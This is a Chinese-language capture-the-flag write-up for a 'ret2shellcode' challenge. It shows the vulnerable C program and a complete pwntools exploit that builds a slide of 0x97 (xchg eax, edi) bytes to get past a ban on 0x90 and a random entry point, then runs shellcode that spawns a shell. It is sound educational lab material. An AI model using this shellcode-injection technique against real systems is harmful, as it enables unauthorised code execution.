# ret2shellcode

## 题目简述

程序把全局缓冲区 `buf` 所在页面改为 `RWX`，读取最多 `0x100` 字节后，从 `buf` 中一个随机偏移处开始执行。源码如下：

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>

void init()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
}

char buf[0x100];

int get_random_number()
{
    int fd;
    unsigned char random_byte;
    ssize_t bytes_read;

    fd = open("/dev/random", O_RDONLY);
    if (fd == -1) {
        return -1;
    }

    bytes_read = read(fd, &random_byte, 1);
    if (bytes_read != 1) {
        close(fd);
        return -1;
    }

    close(fd);
    return (int)random_byte + 1;
}

int main()
{
    init();
    puts("have a good time");
    mprotect((size_t)buf & (~0xfff), 0x1000, 7);
    read(0, buf, 0x100);

    for (int i = 0; i <= 0x100; i++) {
        if (buf[i] == 0x90) {
            puts("No nop");
            exit(0);
        }
    }

    ((void(*)())buf + (get_random_number() % 0x50 + 0x50))();
    return 0;
}
```

正常读取随机数时，执行入口范围为：

```text
buf + 0x50  至  buf + 0x9f
```

因此需要构造一段能从任意字节位置进入、最终滑到 shellcode 的指令序列。同时程序明确禁止字节 `0x90`，不能使用传统 NOP sled。

## 解题过程

### 确认可执行区与随机入口

`mprotect(..., 7)` 对应 `PROT_READ | PROT_WRITE | PROT_EXEC`，所以写入 `.bss` 中的机器码可以直接执行。`get_random_number()` 正常返回 `1` 到 `256`，经 `% 0x50 + 0x50` 后落在 `0x50` 到 `0x9f`。

源码中的循环使用了 `i <= 0x100`，会额外读取 `buf[0x100]` 这一越界字节；但攻击者可控的 `0x100` 字节都会被扫描，只要其中出现 `0x90` 就立即退出。

原稿使用下面的 payload：

```python
payload = asm(shellcraft.sh()).rjust(0x100, b"\x90")
```

这与过滤条件直接冲突，实际运行必然得到 `No nop`，不能作为有效解法。

### 构造不含 0x90 的一字节滑梯

需要选择一条长度为 1 字节、从任意偏移开始都能正确解码，而且不会破坏后续 shellcode 所需状态的指令。AMD64 下字节 `0x97` 是 `xchg eax, edi`。重复执行只会交换两个临时寄存器，而 `shellcraft.sh()` 会自行初始化系统调用参数，因此可用它代替 NOP。

把 shellcode 放在偏移 `0xa0`：随机入口最大为 `0x9f`，所以无论从范围内哪个位置进入，都会先执行若干个 `0x97`，再顺序落入 shellcode。

```python
from pwn import *


context.arch = "amd64"
io = process("./pwn")

shellcode = asm(shellcraft.sh())
slide = b"\x97" * 0xA0  # xchg eax, edi
payload = (slide + shellcode).ljust(0x100, b"\x00")

assert len(payload) == 0x100
assert b"\x90" not in payload

io.sendafter(b"have a good time\n", payload)
io.interactive()
```

当前 amd64 `shellcraft.sh()` 长度为 48 字节，且本身不含 `0x90`，因此 `0xa0 + 48 = 0xd0`，能够完整放入 `0x100` 字节缓冲区。获得 shell 后读取题目中的 flag 文件即可。

## 方法总结

本题不是普通的“可执行 `.bss` 直接塞 shellcode”，还加入了随机入口与禁用 `0x90` 两个约束。关键是先精确计算入口范围，再寻找满足任意字节边界安全的一字节等效滑梯。

多字节 NOP 序列不适合这里，因为随机入口可能落在指令中间；传统 `0x90` 又会被显式拦截。重复单字节 `xchg eax, edi` 能覆盖整个随机区间，随后由自包含 shellcode 重建寄存器状态。构造完成后还应对整个 payload 做坏字符断言，避免 shellcode 本身意外含有禁用字节。
